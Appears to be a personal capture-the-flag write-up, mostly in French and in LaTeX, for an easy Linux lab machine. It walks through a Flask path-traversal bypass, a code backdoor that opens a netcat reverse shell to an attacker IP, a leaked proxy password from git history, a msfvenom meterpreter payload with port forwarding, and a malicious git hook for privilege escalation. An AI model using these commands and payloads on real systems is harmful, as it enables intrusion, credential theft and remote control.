\chapter{OpenSource [Linux:Easy]}


\begin{itemize}
    \item {\bf level}: easy

    \item {\bf keywords}: \gls{t:cron-privesc}, \gls{t:pivoting}, \gls{git}

    \item {\bf tools}: git, metasploit, linPEAS, pspy
\end{itemize}


\subsection{Résumé}

\subsubsection{services enum}
\begin{itemize}
    \item \verb+22/tcp  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)+
    \item \verb+ http   http    Werkzeug/2.1.2 Python/3.10.3+
\end{itemize}


\verb+searchsploit  Werkzeug+
\verb+searchsploit -x 43905+
visiblement il y a une console.

il y a aussi une version metasploit

\subsubsection{Web part}

on essaie l'exploit mais cela ne fonctionne pas malgré le présence de la
console.


\begin{itemize}
    \item \verb+http://10.10.11.164/upcloud+: upload files
    \item \verb+http://10.10.11.164/download+
    \item \verb+http://10.10.11.164/console+
\end{itemize}

upload provide the url

analyse du code:

\begin{verbatim}
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
\end{verbatim}


\begin{verbatim}i
@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
\end{verbatim}


If a path component represents an absolute path, then all previous components
joined are discarded and joining continues from the absolute path component.

donc il faut tester quelque chose comme: \verb+..//etc/passwd+

test: \verb+curl "http://10.10.11.164/uploads/../etc/passwd"+ ne passe pas
alors on essaie
\verb+curl "http://10.10.11.164/uploads/..%2F%2Fetc%2Fpasswd"+
bingo

on peut modifier le code source.

On peut potentiellement mofifier le fichier \verb+view.py+ pour ajouter une
route de reverseshell. Cela ne marche pas.

On peut par contre modifier la fonction \verb+get_file_name+:
\begin{verbatim}
import os
... SIP ...


def get_file_name(unsafe_filename):
    if unsafe_filename == "rshell":
        rshell()
    return recursive_replace(unsafe_filename, "../", "")

def rshell():
    os.system("/usr/bin/nc 10.10.16.3 4444 -e /bin/sh")


\end{verbatim}

\verb+curl 'http://10.10.11.164/uploads/..%2F%2Fapp%2Fapp%2Fview.py+

en explorant le git des source on trouve un truc
\begin{verbatim}
git branch
git log
git checkout dev
git diff c41fedef2ec6df98735c11b2faf1e79ef492a0f3 a76f8f75f7a4a12b706b0cf9c983796fa1985820
\end{verbatim}


\begin{verbatim}
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
\end{verbatim}


\begin{verbatim}
msfvenom -p linux/x86/meterpreter_reverse_tcp  LHOST=10.10.16.3 LPORT=5555 -f elf > meter

use multi/handler
 set payload linux/x86/meterpreter_reverse_tcp
 set lhost 10.10.16.3
 set lport 5555
 run
 portfwd add -l 6666 -p 3000 10.10.11.164


 wget http://127.0.0.1:6666
 \end{verbatim}

 on firefox add a HTTP proxy on 127.0.0.1 port 6666
 then open url http://10.10.11.164:3000

 acess a \verb+id_rsa+

 après avec linPEAS et pspy on constate qu'il y a un cron sur
 \verb+/usr/local/bin/git-sync+ et si on créé un pre-commit hook

 \begin{verbatim}
 cat ~/.git/hooks/pre-commit

!/bin/bash
cp /root/root.txt /tmp/tmp.txt
chmod 777 /tmp/tmp.txt
 \end{verbatim}

 on modifie \verb+.bashrc+ et c'est fini

\subsection{Theorie}
